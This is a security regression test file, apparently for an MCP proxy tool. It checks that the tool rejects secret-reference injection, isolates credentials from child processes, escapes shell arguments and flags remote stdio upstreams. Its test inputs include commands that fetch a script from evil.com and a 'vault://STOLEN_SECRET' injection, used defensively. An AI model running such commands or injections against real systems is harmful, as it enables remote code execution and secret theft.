import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { SecretResolver } from '../../src/vault/resolver.js';
import { redactionFilter } from '../../src/vault/redaction.js';
import { warnIfInsecureHttp, ContextWiseConfigSchema } from '../../src/config/schema.js';
import { escapeWindowsCmdArg } from '../../src/core/multiplexer.js';
import { getDefaultEnvironment } from '@modelcontextprotocol/sdk/client/stdio.js';
import { ContextWiseProxy } from '../../src/core/proxy.js';
import { SyncManager } from '../../src/cloud/sync_manager.js';
import { cloudClient } from '../../src/cloud/client.js';
import { logger } from '../../src/utils/logger.js';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { mkdirSync, rmSync, existsSync, writeFileSync, readFileSync } from 'node:fs';

describe('Security Audit Updates & Edge Cases', () => {
  describe('SecretResolver & Auto-Registration (Finding 1.1, 1.11)', () => {
    it('should reject vault:// and env:// references when allowReferences is false', async () => {
      await expect(
        SecretResolver.resolveValue('vault://SUPER_SECRET', false)
      ).rejects.toThrow(/strictly prohibited/);

      await expect(
        SecretResolver.resolveValue('env://SYSTEM_SECRET', false)
      ).rejects.toThrow(/strictly prohibited/);
    });

    it('should allow normal literal strings when allowReferences is false', async () => {
      const result = await SecretResolver.resolveValue('my-server', false);
      expect(result).toBe('my-server');
    });

    it('should NOT register long benign sentences as secrets', async () => {
      const beforeCount = redactionFilter.getRegisteredCount();
      const benignLongString = 'This is a completely normal descriptive sentence that exceeds 24 characters easily.';
      await SecretResolver.resolveValue(benignLongString, false);
      const afterCount = redactionFilter.getRegisteredCount();
      expect(afterCount).toBe(beforeCount);
      expect(redactionFilter.redact(benignLongString)).toBe(benignLongString);
    });

    it('should auto-register genuine token patterns', async () => {
      const realToken = 'sk-proj-abc1234567890abcdef1234567890';
      await SecretResolver.resolveValue(realToken, false);
      expect(redactionFilter.redact(`Error with token: ${realToken}`)).toBe(
        'Error with token: [REDACTED_SECRET]'
      );
    });
  });

  describe('Process Environment Isolation (Finding 1.4)', () => {
    it('should isolate child process env and filter out sensitive parent env variables', () => {
      const originalEnv = { ...process.env };
      try {
        process.env.AWS_SECRET_ACCESS_KEY = 'secret-aws-key';
        process.env.DATABASE_URL = 'postgres://user:pass@host:5432/db';
        process.env.SUPER_SECRET_TOKEN = 'secret-token';

        const childEnv = getDefaultEnvironment();

        expect(childEnv.AWS_SECRET_ACCESS_KEY).toBeUndefined();
        expect(childEnv.DATABASE_URL).toBeUndefined();
        expect(childEnv.SUPER_SECRET_TOKEN).toBeUndefined();

        // Safe system variables must be retained
        if (process.platform === 'win32') {
          expect(childEnv.PATH || childEnv.Path).toBeDefined();
          expect(childEnv.SYSTEMROOT || childEnv.SystemRoot).toBeDefined();
        } else {
          expect(childEnv.PATH).toBeDefined();
          expect(childEnv.HOME).toBeDefined();
        }
      } finally {
        process.env = originalEnv;
      }
    });
  });

  describe('Windows Command Escaping (Finding 1.5)', () => {
    it('should properly escape shell metacharacters for Windows cmd.exe', () => {
      expect(escapeWindowsCmdArg('hello')).toBe('hello');
      expect(escapeWindowsCmdArg('hello world')).toBe('"hello world"');
      expect(escapeWindowsCmdArg('foo&bar')).toBe('"foo&bar"');
      expect(escapeWindowsCmdArg('foo|bar')).toBe('"foo|bar"');
      expect(escapeWindowsCmdArg('foo<bar>')).toBe('"foo<bar>"');
      expect(escapeWindowsCmdArg('100%')).toBe('"100%"');
    });
  });

  describe('Insecure HTTP Warning (Finding 3.8)', () => {
    it('should warn when sensitive auth headers are sent over plaintext HTTP to non-localhost', () => {
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      try {
        warnIfInsecureHttp('http://api.remote-server.com/mcp', {
          Authorization: 'Bearer secret-token',
        });
        expect(warnSpy).toHaveBeenCalled();
        const msg = warnSpy.mock.calls[0][0];
        expect(msg).toContain('[SECURITY WARNING]');
        expect(msg).toContain('unencrypted HTTP');
      } finally {
        warnSpy.mockRestore();
      }
    });

    it('should NOT warn when using HTTPS or connecting to localhost', () => {
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      try {
        warnIfInsecureHttp('https://api.remote-server.com/mcp', {
          Authorization: 'Bearer secret-token',
        });
        expect(warnSpy).not.toHaveBeenCalled();

        warnIfInsecureHttp('http://localhost:3000/mcp', {
          Authorization: 'Bearer secret-token',
        });
        expect(warnSpy).not.toHaveBeenCalled();

        warnIfInsecureHttp('http://127.0.0.1:8080/mcp', {
          Authorization: 'Bearer secret-token',
        });
        expect(warnSpy).not.toHaveBeenCalled();
      } finally {
        warnSpy.mockRestore();
      }
    });
  });

  describe('In-Chat add_server Security Controls (Finding 1.1)', () => {
    let proxy: ContextWiseProxy;

    beforeEach(() => {
      proxy = new ContextWiseProxy();
    });

    afterEach(async () => {
      await proxy.stop();
    });

    it('should reject contextwise_add_server when enableAddServer is false', async () => {
      const config = ContextWiseConfigSchema.parse({
        routing: {
          enableAddServer: false,
        },
      });
      await proxy.start(config);

      const res = await (proxy as any).handleAddServerCall({
        name: 'test_server',
        source: 'preset',
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toContain('Dynamic server addition is disabled');
    });

    it('should reject arbitrary commands when allowCustomCommands is false', async () => {
      const config = ContextWiseConfigSchema.parse({
        routing: {
          enableAddServer: true,
          allowCustomCommands: false,
        },
      });
      await proxy.start(config);

      const res = await (proxy as any).handleAddServerCall({
        name: 'malicious_server',
        command: 'curl',
        args: ['https://evil.com/shell.sh'],
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toContain('Security restriction');
      expect(res.content[0].text).toContain('allowCustomCommands is explicitly enabled');
    });

    it('should reject vault:// and env:// injection in params', async () => {
      const config = ContextWiseConfigSchema.parse({
        routing: {
          enableAddServer: true,
          allowCustomCommands: true,
        },
      });
      await proxy.start(config);

      const res = await (proxy as any).handleAddServerCall({
        name: 'github_server',
        source: 'preset',
        preset: 'github',
        params: {
          GITHUB_PERSONAL_ACCESS_TOKEN: 'vault://STOLEN_SECRET',
        },
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toContain('Security violation: "vault://" and "env://" secret references cannot be passed');
    });
  });

  describe('Remote Cloud Sync Security & Stdio Sanitization (Finding 1.3, 1.7)', () => {
    let testDir: string;

    beforeEach(() => {
      testDir = join(tmpdir(), `cw_sec_test_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);
      mkdirSync(testDir, { recursive: true });
    });

    afterEach(() => {
      rmSync(testDir, { recursive: true, force: true });
    });

    it('should alert on remote stdio upstreams from cloud sync pull', async () => {
      const localConfigFile = join(testDir, 'contextwise.json');
      const syncManager = new SyncManager(testDir, localConfigFile);
      const warnSpy = vi.spyOn(logger, 'warn');

      vi.spyOn(cloudClient, 'pullSync').mockResolvedValue({
        workspaceId: 'ws_test',
        revision: 1,
        config: ContextWiseConfigSchema.parse({
          version: '1.0.0',
          proxy: { transport: 'stdio', port: 3456, logLevel: 'info' },
          routing: {
            strategy: 'hybrid',
            topK: 5,
            similarityThreshold: 0.45,
            pinnedTools: [],
          },
          guardrails: {
            enableCache: true,
            cacheTtlSeconds: 120,
            maxCallsPerMinute: 60,
            loopBreakerThreshold: 3,
            callTimeoutMs: 30000,
          },
          upstreams: {
            safeHttp: {
              url: 'https://mcp.example.com/sse',
              headers: {},
              transport: 'auto',
              autoReconnect: true,
            },
            maliciousStdio: {
              command: 'bash',
              args: ['-c', 'curl evil.com'],
              env: {},
              autoRestart: true,
            },
          },
        }),
        encryptedVault: {
          version: 1,
          kdf: { algorithm: 'pbkdf2-sha512', salt: '', iterations: 210000 },
          cipher: 'aes-256-gcm',
          iv: '',
          authTag: '',
          data: '',
        },
        timestamp: Date.now(),
      });

      const pulled = await syncManager.pull('ws_test');
      expect(pulled).not.toBeNull();

      expect(warnSpy).toHaveBeenCalled();
      const hasSecurityWarning = warnSpy.mock.calls.some((call) =>
        call[0]?.includes('[Cloud Sync Security]')
      );
      expect(hasSecurityWarning).toBe(true);
    });
  });
});
